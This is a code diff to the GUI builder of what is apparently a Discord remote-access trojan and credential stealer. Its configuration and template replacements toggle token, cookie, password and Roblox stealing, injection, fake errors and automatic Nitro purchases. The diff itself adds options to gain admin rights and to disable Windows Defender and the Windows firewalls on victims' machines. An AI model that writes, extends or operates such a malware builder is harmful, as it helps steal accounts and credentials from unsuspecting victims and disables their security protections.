@@ -71,9 +71,11 @@ data_builder = {
     "ping": False,
     "fake_error": False,
     "nitro_buy": False,
-    "defender_fucker": False,
+    "get_admin": False,
+    "disable_defender": False,
+    "disable_firewalls": False,
     "vm_detect": False,
-    "vm_webhook_url": "",
+    "vm_webhook_url": ""
 }
 
 links = {
@@ -207,8 +209,8 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("KNIGHT_DISCORD_RAT_LISTENER_USER_ID", f"{data_builder['knight_user_id']}") \
                 .replace("KNIGHT_DISCORD_RAT_PREFIX", f"{data_builder['knight_prefix']}") \
                 .replace("startup = False", f"startup = {data_builder['startup']}") \
-                .replace("self.injection = False", f"self.injection = {data_builder['injection']}") \
-                .replace("self.token_stealing = False", f"self.token_stealing = {data_builder['token']}") \
+                .replace("injection = False", f"injection = {data_builder['injection']}") \
+                .replace("token_stealing = False", f"token_stealing = {data_builder['token']}") \
                 .replace("cookie_stealing = False", f"cookie_stealing = {data_builder['cookie']}") \
                 .replace("password_stealing = False", f"password_stealing = {data_builder['password']}") \
                 .replace("malicious_stealing = False", f"malicious_stealing = {data_builder['malicious']}") \
@@ -216,7 +218,9 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("roblox_stealing = False", f"roblox_stealing = {data_builder['roblox']}") \
                 .replace("screenshot = False", f"screenshot = {data_builder['roblox']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
-                .replace("defenderfucker = False", f"defenderfucker = {data_builder['defender_fucker']}") \
+                .replace("get_admin = False", f"get_admin = {data_builder['get_admin']}") \
+                .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
+                .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
                 .replace("fake_error = False", f"fake_error = {data_builder['fake_error']}") \
                 .replace("nitro_auto_buy = False", f"nitro_auto_buy = {data_builder['nitro_buy']}") \
                 .replace("vmdetection = False", f"vmdetection = {data_builder['vm_detect']}") \
@@ -323,11 +327,11 @@ def _functions():
                     'Nitro Auto Buy',
                     on_change=lambda e: change_data('nitro_buy', e.value)
                 ).bind_visibility_from(_inj, 'value').props('inline color=pink')  
-                                                
-            ui.checkbox(
-                'Defender Fucker',
-                on_change=lambda e: change_data('defender_fucker', e.value)
-            ).props('inline color=pink')
+                
+            with ui.row():
+                _admin = ui.checkbox('Get admin', on_change=lambda e: change_data('get_admin', e.value)).props('inline color=pink')
+                ui.checkbox('Disable Windows Defender', on_change=lambda e: change_data('disable_defender', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
+                ui.checkbox('Disable Windows Firewalls', on_change=lambda e: change_data('disable_firewalls', e.value)).props('inline color=black-2').bind_visibility_from(_admin, 'value').props('inline color=pink')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
             with ui.row():
